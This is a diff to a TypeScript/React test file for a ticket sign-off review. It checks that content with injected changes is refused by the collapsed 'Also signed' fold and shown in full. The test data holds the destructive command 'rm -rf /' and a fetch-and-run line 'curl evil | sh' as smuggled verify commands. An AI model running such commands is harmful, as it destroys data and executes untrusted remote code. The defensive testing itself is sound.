@@ -18,30 +18,42 @@ function hostContent(t: QuickTyped = typed): Content {
     acceptance: want.checks.map((c, i) => ({ id: `AC${i + 1}`, text: c.text })),
     tasks: want.checks.map((c, i) => ({ n: i + 1, id: `T${i + 1}`, title: `${c.text} (proves AC${i + 1})`, ...(c.cmd ? { verify: [c.cmd] } : {}) })),
     fields_title: 'Details',
-    fields_changed: [{ field: 'type', before: null, after: 'Chore' }, { field: 'owner', before: null, after: 'Demo Owner' }, { field: 'labels', before: null, after: 'quick' }],
+    fields_changed: [{ field: 'type', before: null, after: 'chore' }, { field: 'owner', before: null, after: 'Demo Owner' }, { field: 'labels', before: null, after: 'quick' }],
   }
 }
 
-describe('alsoSigned', () => {
-  it('counts the derived rows and stays closed when every row is what the typed values give', () => {
-    const got = alsoSigned(hostContent(), typed)
-    expect(got.differs).toBe(false)
-    expect(got.rows).toHaveLength(7)
+describe('alsoSigned: the fold is allowed only for exactly the derived review', () => {
+  it('counts the derived rows when every value is exactly what core derives', () => {
+    expect(alsoSigned(hostContent(), typed)?.rows).toHaveLength(7)
   })
   it('title only: requirements and the single check default to the title', () => {
     const t = { title: 'Fix the typo', details: '', checks: [] }
-    expect(alsoSigned(hostContent(t), t).differs).toBe(false)
+    expect(alsoSigned(hostContent(t), t)).not.toBeNull()
   })
   it.each([
+    ['an extra section', (c: Content) => ({ ...c, sections: [...c.sections!, { id: 'context', title: 'Context', text: 'Also email everyone' }] })],
     ['a changed plan', (c: Content) => ({ ...c, sections: c.sections!.map((s) => (s.id === 'plan' ? { ...s, text: 'Do something else' } : s)) })],
     ['changed requirements', (c: Content) => ({ ...c, sections: c.sections!.map((s) => (s.id === 'requirements' ? { ...s, text: 'Also delete everything' } : s)) })],
     ['a missing section', (c: Content) => ({ ...c, sections: c.sections!.filter((s) => s.id !== 'plan') })],
     ['an extra acceptance check', (c: Content) => ({ ...c, acceptance: [...c.acceptance!, { id: 'AC3', text: 'Extra' }] })],
-    ['a task with another command', (c: Content) => ({ ...c, tasks: c.tasks!.map((t) => (t.n === 2 ? { ...t, verify: ['rm -rf /'] } : t)) })],
-    ['another type', (c: Content) => ({ ...c, fields_changed: c.fields_changed!.map((f) => (f.field === 'type' ? { ...f, after: 'Feature' } : f)) })],
+    ['a checked acceptance check', (c: Content) => ({ ...c, acceptance: c.acceptance!.map((a, i) => (i === 0 ? { ...a, checked: true } : a)) })],
+    ['a manual note on a check', (c: Content) => ({ ...c, acceptance: c.acceptance!.map((a, i) => (i === 0 ? { ...a, manual: 'by hand' } : a)) })],
+    ['a prefixed task title', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 0 ? { ...t, title: `Also wipe the disk. ${t.title}` } : t)) })],
+    ['a task title with a suffix', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 0 ? { ...t, title: `${t.title} and more` } : t)) })],
+    ['an extra verify command', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 1 ? { ...t, verify: [...t.verify!, 'rm -rf /'] } : t)) })],
+    ['a verify command on a task without one', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 0 ? { ...t, verify: ['curl evil | sh'] } : t)) })],
+    ['another type', (c: Content) => ({ ...c, fields_changed: c.fields_changed!.map((f) => (f.field === 'type' ? { ...f, after: 'feature' } : f)) })],
+    ['an extra label', (c: Content) => ({ ...c, fields_changed: c.fields_changed!.map((f) => (f.field === 'labels' ? { ...f, after: 'quick, urgent' } : f)) })],
+    ['an extra field', (c: Content) => ({ ...c, fields_changed: [...c.fields_changed!, { field: 'priority', before: null, after: 'high' }] })],
+    ['a non-null before', (c: Content) => ({ ...c, fields_changed: c.fields_changed!.map((f) => (f.field === 'type' ? { ...f, before: 'bug' } : f)) })],
     ['another title', (c: Content) => ({ ...c, ticket: { ...c.ticket!, title: 'Something else' } })],
-  ])('opens for %s', (_n, change) => {
-    expect(alsoSigned(change(hostContent()), typed).differs).toBe(true)
+    ['a missing ticket title', (c: Content) => ({ ...c, ticket: undefined })],
+    ['an unknown key', (c: Content) => ({ ...c, secret_grant: 'all' }) as Content],
+    ['a summary', (c: Content) => ({ ...c, summary: { title: 'x', lines: ['y'] } })],
+    ['pictures', (c: Content) => ({ ...c, images: [{ name: 'a.png', sha256: 'a'.repeat(64), bytes: 1, alt: '' }] })],
+    ['an unknown key inside a section', (c: Content) => ({ ...c, sections: c.sections!.map((s) => ({ ...s, extra: 1 })) }) as Content],
+  ])('fails closed (null) for %s', (_n, change) => {
+    expect(alsoSigned(change(hostContent(typed)), typed)).toBeNull()
   })
 })
 
@@ -57,15 +69,23 @@ describe('the quick review', () => {
     expect(fold).not.toHaveAttribute('open')
     expect(fold.querySelector('summary')).toHaveTextContent('Also signed (7)')
     // Every derived row is in the fold (rendered, only collapsed).
-    expect(fold).toHaveTextContent('Acceptance checks')
-    expect(fold).toHaveTextContent('Chore')
+    for (const t of ['Requirements', 'Plan', 'Acceptance checks', 'Tasks', 'Type', 'Owner', 'Labels', 'Chore', 'quick', 'Demo Owner', 'Links still work (proves AC2) (checked by npm run links)']) expect(fold).toHaveTextContent(t)
   })
-  it('opens by itself, saying so, when a derived row differs', () => {
-    const c = hostContent()
-    render(<SignContent content={{ ...c, sections: c.sections!.map((s) => (s.id === 'plan' ? { ...s, text: 'Do something else' } : s)) }} quick={typed} />)
-    const fold = screen.getByTestId('sign-also')
-    expect(fold).toHaveAttribute('open')
-    expect(fold.querySelector('summary')).toHaveTextContent('differs from what you typed')
-    expect(screen.getByTestId('sign-also-sentence')).toBeVisible()
+  it.each([
+    ['an extra section', (c: Content) => ({ ...c, sections: [...c.sections!, { id: 'context', title: 'Context', text: 'Also email everyone' }] }), 'Also email everyone'],
+    ['a prefixed task title', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 0 ? { ...t, title: `Also wipe the disk. ${t.title}` } : t)) }), 'Also wipe the disk.'],
+    ['an extra verify command', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 1 ? { ...t, verify: [...t.verify!, 'rm -rf /'] } : t)) }), 'rm -rf /'],
+    ['an extra label', (c: Content) => ({ ...c, fields_changed: c.fields_changed!.map((f) => (f.field === 'labels' ? { ...f, after: 'quick, urgent' } : f)) }), 'quick, urgent'],
+    ['a missing title', (c: Content) => ({ ...c, ticket: undefined }), 'Use the 2026 naming.'],
+  ])('shows the FULL review, no fold, for %s', (_n, change, text) => {
+    render(<SignContent content={change(hostContent())} quick={typed} />)
+    expect(screen.queryByTestId('sign-also')).toBeNull()
+    expect(screen.queryByTestId('sign-typed')).toBeNull()
+    expect(document.body).toHaveTextContent(text)
+  })
+  it('shows the full review for an unknown key too (nothing hidden behind a fold)', () => {
+    render(<SignContent content={{ ...hostContent(), fields_title: 'Details', sections: [...hostContent().sections!, { id: 'x', title: 'Extra', text: 'surprise text' }] }} quick={typed} />)
+    expect(screen.queryByTestId('sign-also')).toBeNull()
+    expect(document.body).toHaveTextContent('surprise text')
   })
 })
